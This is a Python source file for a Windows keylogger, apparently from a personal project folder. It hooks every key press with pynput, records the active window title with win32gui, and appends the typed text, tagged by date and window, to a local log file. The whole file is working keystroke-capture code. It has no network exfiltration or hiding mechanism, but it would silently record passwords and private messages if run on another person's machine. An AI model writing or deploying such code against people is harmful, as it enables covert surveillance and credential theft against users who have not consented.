from pynput import keyboard
import win32gui
from datetime import date

def write_log(window, text):
	"""Write data to txt file."""
	
	log_file = open(r'C:\Users\Vartotojas\Desktop\github\keylogger\log.txt','a', encoding="utf-8")
	info = date.today().strftime("%Y-%m-%d") + ' ' + window + ': ' + text + '\n'
	log_file.write(info) 
	log_file.close()
	
def get_window():
	"""Get active window name."""
	
	window = win32gui.GetWindowText (win32gui.GetForegroundWindow())
	
	return window
	
#Keys that should be skipped
skipped_keys = ['f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 
				'f10', 'f11', 'f12', 'esc', 'tab', 'ctrl_l', 'ctrl_r',
				'cmd', 'alt_l', 'alt_r', 'menu', 'insert', 'print_screen',
				'home', 'page_up', 'page_down', 'end', 'up', 'down', 'enter']
	
text = ''
window = ''
first_time = True

def on_press(key):
	
	#Make variables global
	global text
	global window
	global first_time
	
	#Get active window title
	new_window = get_window()

	#Check if current active window has changed
	if new_window != window:
		#If it has write collected data to log file
		if not first_time:
			write_log(window, text)
			text = ''
		#Set new_window as window
		window = new_window
		first_time = True
	elif new_window == window:
		#If still the same active window
		first_time = False
	
	#Get pressed key
	try:
		pressed_key = key.char
			
	except AttributeError:
		raw_key = str(key)
		pressed_key = raw_key.replace('Key.', '')
		
	#Concatinate keys to text
	if pressed_key == 'space':
		text += ' '
	elif pressed_key in skipped_keys:
		text += ''
	else:
		text += pressed_key

#Run keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
	listener.join()
